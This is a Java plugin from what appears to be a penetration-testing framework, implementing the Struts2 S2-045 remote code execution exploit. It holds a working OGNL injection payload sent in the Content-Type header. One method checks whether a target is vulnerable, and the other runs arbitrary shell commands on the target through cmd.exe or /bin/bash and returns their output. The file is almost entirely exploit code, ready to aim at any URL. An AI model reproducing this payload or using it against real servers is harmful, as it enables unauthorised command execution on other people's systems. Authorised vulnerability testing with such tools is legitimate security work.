package com.orleven.tentacle.permeate.script;

import java.io.IOException;
import java.util.Map;

import org.apache.http.ParseException;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;
import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.define.Message;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.permeate.bean.ProveBean;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;
import com.orleven.tentacle.util.WebUtil;

/**
 * Struts2 RCE 045
 * @author orleven
 * @date 2017年3月8日
 */
@Component
@Scope("prototype")
public class Struts2RCE045 extends WebScriptBase {

	public Struts2RCE045(){
		super();
	}
	
	@Override
	public void prove() {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String provePayload = "%{(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('ProveFlag','The Struts2-045 Remote Code Execution Is Exist!'))}.multipart/form-data";
		String proveFlag = "The Struts2-045 Remote Code Execution Is Exist!";
		String result = null;
		try {
			getHttpHeaders().put("Content-Type", provePayload);
			Map<String, String> resHeaders = WebUtil.getResponseAllHeaders(WebUtil.httpGet(getTargetUrl(), getHttpHeaders()));
			if (resHeaders!=null&&resHeaders.get("ProveFlag")!=null&&resHeaders.get("ProveFlag").equals(proveFlag)) {
				getVulnerBean().setIsVulner(Permeate.isVulner);
			}else{
				getVulnerBean().setIsVulner(Permeate.isNotVulner);
			}
		} catch (ParseException e) {
			result = Message.notAvailable;
			getVulnerBean().setIsVulner(Permeate.isNotVerified);
			e.printStackTrace();
		} finally{
			proveBean.setReceiveMessage(result);
			proveBean.setSendMessage("Content-Type: "+provePayload);
			getVulnerBean().getProveBean().add(proveBean);
		}
	}

	@Override
	public void execCommand(String command) {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String execPayload1 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo ----- The Struts2-045 Remote Code Execution -----  &&";
		String execPayload2 = "&& echo ----- The Struts2-045 Remote Code Execution ----- ').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
		String result = "";
		try {
			String flag = "----- The Struts2-045 Remote Code Execution -----";
			getHttpHeaders().put("Content-Type", execPayload1 + command + execPayload2);
			result = WebUtil.getResponseBody(WebUtil.httpGet(getTargetUrl(), getHttpHeaders()));
			if(result!=null){
				result = result.substring(result.indexOf(flag));
			}
		} catch (ParseException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally{
			proveBean.setReceiveMessage(result);
			proveBean.setSendMessage(command);
			getVulnerBean().getProveBean().add(proveBean);
		}
	}
}
